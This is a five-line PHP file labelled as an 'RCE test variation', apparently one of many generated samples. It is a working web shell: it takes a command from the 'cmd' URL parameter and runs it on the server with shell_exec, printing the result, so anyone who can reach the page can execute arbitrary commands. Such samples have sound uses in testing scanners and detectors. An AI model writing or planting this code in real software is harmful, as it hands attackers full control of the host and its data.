<?php
// RCE test variation #1303
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>